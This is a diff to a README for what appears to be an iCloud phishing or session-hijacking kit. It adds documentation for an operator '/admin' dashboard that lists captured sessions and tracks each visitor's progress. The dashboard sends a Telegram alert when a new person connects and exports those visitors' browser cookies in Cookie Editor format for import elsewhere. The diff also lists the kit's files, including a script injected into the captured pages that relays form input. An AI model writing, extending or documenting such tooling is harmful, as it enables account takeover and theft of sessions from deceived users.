@@ -37,6 +37,45 @@ its own [README](src/README.md), and `/src/` lists whatever is in it.
 > socket needs a WebSocket implementation; without one uvicorn treats the
 > upgrade as an ordinary HTTP request and answers 404.
 
+## The control room
+
+`/admin` is a dashboard for the operator: every session the server has, how
+far each one has got, a note on Telegram when somebody new connects, and the
+cookies of the sessions that are allowed to be exported.
+
+```bash
+ICLOUD_ADMIN_TOKEN=your-secret python server.py
+```
+
+Then open <http://localhost:9002/admin> and give it the secret. It is kept in
+a cookie of its own (`HttpOnly`, `SameSite=Strict`) for a week.
+
+**The secret.** `ICLOUD_ADMIN_TOKEN` in the environment has it first: a
+secret in a file on disk is a secret that can be committed by accident. It
+can also live in `admin.json`, next to the app, which is written with the
+permissions of a secret (0600) and is in `.gitignore`.
+
+**The dashboard** shows what the server actually knows — the sessions it has,
+what each one's browser is doing, the step it is on, and how long ago it was
+seen — and it refreshes every two seconds. Nothing in it is made up: it is
+the same `SESSIONS` the app itself works with.
+
+**Telegram.** Put the bot token and the chat id in the Telegram tab and a
+message goes out when a new client connects. The message is sent in the
+background: the person connecting does not wait for Telegram, and Telegram
+being down does not break the app. The token is never sent back to the page —
+only its first and last four characters are.
+
+**The cookies** are the browser's own, in the format Cookie Editor reads and
+writes, so a file can be dropped straight into it. A session's cookies are
+exported when the session has been *allowed* to be exported, by name, in the
+panel — or when the request is that session's own visitor. Nobody else's
+cookies are handed out because somebody asked.
+
+The panel is one page (`admin.html`), served by the same server, with the
+font it uses served from the app as well: Space Grotesk, so the panel looks
+the same whether the machine has a network or not.
+
 ## The mirrored capture pipeline is gone
 
 The old design had three moving parts: an agent in the real browser that
@@ -634,6 +673,7 @@ the project virtualenv by itself.
 ## Files
 
 - `server.py` — FastAPI: `/` `/start` `/status` `/src/…` `/sync.js` `/ws` `/nav`
+  and `/admin` (the control room, from `admin.py`)
 - `sync.js` — runs in the captured page; reports and applies form state, clicks
   and navigation, and talks to the browser through the server
 - `live.py` — the bridge to the browser the server opened: finds a control by
@@ -642,6 +682,10 @@ the project virtualenv by itself.
 - `client.html` — the launcher; opens the browser, then becomes `/src/1.html`
 - `src/` — the captures (yours; `1.html` is the one the app opens) and
   `src/flow.json`, which says which capture leads to which
+- `admin.py` and `admin.html` — the control room: the panel, its API, and
+  the settings it keeps (`admin.json`, a secret file, in `.gitignore`)
+- `telegram.py` — the Telegram notifier
+- `fonts/` — Space Grotesk, served by the app (SIL Open Font License 1.1)
 - `run.bat` — Windows launcher
 - `tests/` — the suites above
 
